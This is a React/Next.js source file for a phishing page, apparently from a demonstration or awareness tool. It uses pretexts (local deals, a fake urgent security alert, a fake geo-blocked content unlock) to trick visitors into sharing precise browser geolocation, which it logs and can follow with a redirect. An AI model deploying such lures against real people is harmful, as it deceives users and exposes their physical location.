
"use client";
import { useEffect, useState } from 'react';
import { useParams } from 'next/navigation';
import { useLogs } from '@/contexts/LogContext';
import type { LocationData } from '@/types';
import { Button } from '@/components/ui/button';
import { PhishingPageLayout } from '@/components/phishing/PhishingPageLayout';
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
import { Card as ShadcnCard, CardContent, CardDescription as ShadcnCardDescription } from '@/components/ui/card'; // Renamed to avoid conflict
import Image from 'next/image';
import { MapPin, CheckCircle, AlertTriangle, Sparkles, ShieldAlert, Lock, type LucideIcon } from 'lucide-react';

interface TemplateContent {
  title: string;
  actionText: string;
  message: string; 
  heroIcon?: LucideIcon;
  pageSpecificMessage?: string; 
}

const templateContent: Record<string, TemplateContent> = {
  'nearby-deals': {
    title: 'Discover Amazing Deals Near You!',
    actionText: 'Find My Deals',
    message: 'Unlock exclusive offers and discounts from local stores.',
    pageSpecificMessage: 'Share your location to see personalized deals from shops and restaurants in your area. Limited time offers available now!',
    heroIcon: Sparkles,
  },
  'security-alert': {
    title: 'Urgent: Account Security Action Required',
    actionText: 'Verify Location & Secure Account',
    message: "To protect your account, please verify your current location.",
    pageSpecificMessage: "We've detected unusual activity potentially related to your account. Verifying your location is a crucial step to ensure your account remains secure. This is a standard security measure.",
    heroIcon: ShieldAlert,
  },
  'content-unlock': {
    title: 'Unlock Exclusive Local Content',
    actionText: 'Verify Location to Access',
    message: "this content is blocked in some areas.",
    pageSpecificMessage: "Access videos, images, novels, and other files that are restricted in certain countries. Share your location to confirm you reside in a region where this content is available and not blocked.",
    heroIcon: Lock,
  },
  default: {
    title: 'Location Verification Needed',
    actionText: 'Verify My Location',
    message: 'Please share your location to continue using this service.',
    heroIcon: MapPin,
  }
};

const CONTENT_UNLOCK_REDIRECT_URL_KEY = 'contentUnlockRedirectUrl';

export default function LocationPhishingPage() {
  const { addLog } = useLogs();
  const params = useParams();
  const templateId = typeof params.id === 'string' ? params.id : 'default';
  const content = templateContent[templateId] || templateContent.default;

  const [status, setStatus] = useState<'idle' | 'requesting' | 'captured' | 'error'>('idle');
  const [error, setError] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const [statusMessage, setStatusMessage] = useState<string | undefined>(undefined);

  useEffect(() => {
    addLog({ type: 'generic', data: { message: `Visited location phishing page: /phishing/location/${templateId}` } });
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [templateId]);

  useEffect(() => {
    if (status === 'captured') {
      if (templateId === 'content-unlock') {
        const redirectUrl = localStorage.getItem(CONTENT_UNLOCK_REDIRECT_URL_KEY);
        if (redirectUrl && redirectUrl.trim() !== '') {
          setStatusMessage("Location verified. Thank you. Now you'll be redirected to the wanted website.");
          setTimeout(() => {
            window.location.href = redirectUrl;
          }, 2500); // Delay for message visibility
        } else {
          setStatusMessage("Location verified. Thank you. This window can now be closed.");
        }
      } else {
        setStatusMessage('Location data successfully captured for demonstration.');
      }
    } else {
      setStatusMessage(undefined);
    }
  }, [status, templateId]);

  const handleLocationRequest = () => {
    if (!navigator.geolocation) {
      setError('Geolocation is not supported by your browser.');
      setStatus('error');
      addLog({ type: 'generic', data: { message: 'Geolocation not supported' } });
      return;
    }

    setStatus('requesting');
    setIsLoading(true);
    setError(null);

    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const locationData: LocationData = {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy,
        };
        
        addLog({ type: 'location', data: locationData });
        setStatus('captured');
        setIsLoading(false);
      },
      (err) => {
        let errorMessage = 'Unknown error occurred.';
        switch (err.code) {
          case err.PERMISSION_DENIED:
            errorMessage = 'Location access denied by user.';
            break;
          case err.POSITION_UNAVAILABLE:
            errorMessage = 'Location information is unavailable.';
            break;
          case err.TIMEOUT:
            errorMessage = 'The request to get user location timed out.';
            break;
        }
        setError(errorMessage);
        setStatus('error');
        addLog({ type: 'generic', data: { message: `Location error: ${errorMessage}` } });
        setIsLoading(false);
      },
      { timeout: 10000, enableHighAccuracy: true }
    );
  };

  const renderTemplateSpecificContent = () => {
    const HeroIcon = content.heroIcon || MapPin;
    switch (templateId) {
      case 'nearby-deals':
        return (
          <div className="text-center space-y-6">
            <HeroIcon className="w-16 h-16 text-accent mx-auto" />
            <p className="text-xl text-foreground font-semibold">{content.message}</p>
            <p className="text-md text-muted-foreground">{content.pageSpecificMessage}</p>
          </div>
        );
      case 'security-alert':
        return (
          <Alert variant="destructive" className="mb-6 text-left">
            <div className="flex items-center mb-2">
              <HeroIcon className="h-6 w-6 mr-3" />
              <AlertTitle className="text-lg font-semibold">Security Check Required</AlertTitle>
            </div>
            <AlertDescription className="text-md">
              {content.pageSpecificMessage || content.message}
            </AlertDescription>
          </Alert>
        );
      case 'content-unlock':
        return (
          <ShadcnCard className="mb-6 bg-muted/30 p-6 text-center shadow-inner border-dashed">
            <CardContent className="space-y-4">
              <HeroIcon className="w-20 h-20 text-primary/60 mx-auto" />
              <ShadcnCardDescription className="text-xl text-foreground font-semibold">{content.message}</ShadcnCardDescription>
              <p className="text-md text-muted-foreground">{content.pageSpecificMessage}</p>
            </CardContent>
          </ShadcnCard>
        );
      default:
        return (
          <div className="text-center space-y-4">
            <HeroIcon className="w-16 h-16 text-primary mx-auto" />
            <p className="text-xl text-muted-foreground">{content.message}</p>
          </div>
        );
    }
  };

  return (
    <PhishingPageLayout 
        title={content.title}
        isLoading={isLoading && status !== 'captured'}
        error={error}
        statusMessage={statusMessage}
    >
      <div className="space-y-6">
        {renderTemplateSpecificContent()}

        {status !== 'captured' && (
          <Button 
            onClick={handleLocationRequest} 
            size="lg"
            className="w-full bg-accent hover:bg-accent/90 text-accent-foreground text-lg py-6 shadow-md"
            disabled={isLoading || status === 'requesting'}
          >
            <MapPin className="mr-2 h-6 w-6" />
            {isLoading ? 'Verifying...' : content.actionText}
          </Button>
        )}

        {status === 'captured' && (
          <div className="text-center p-4 bg-green-100 border border-green-300 rounded-md shadow">
            <CheckCircle className="mx-auto h-12 w-12 text-green-600 mb-2" />
            <p className="text-xl font-semibold text-green-700">
              {templateId === 'content-unlock' && localStorage.getItem(CONTENT_UNLOCK_REDIRECT_URL_KEY) 
                ? "Location verified. Thank you. Now you'll be redirected..." 
                : "Location Verified (Simulated)"}
            </p>
            <p className="text-md text-green-600">
              {templateId === 'content-unlock' && localStorage.getItem(CONTENT_UNLOCK_REDIRECT_URL_KEY)
                ? "Please wait."
                : "Thank you. This window can now be closed."}
            </p>
          </div>
        )}
        {status === 'error' && error && (
          <Alert variant="destructive" className="mt-6">
            <AlertTriangle className="h-5 w-5" />
            <AlertTitle>Location Access Failed</AlertTitle>
            <AlertDescription>{error}</AlertDescription>
          </Alert>
        )}
      </div>
    </PhishingPageLayout>
  );
}
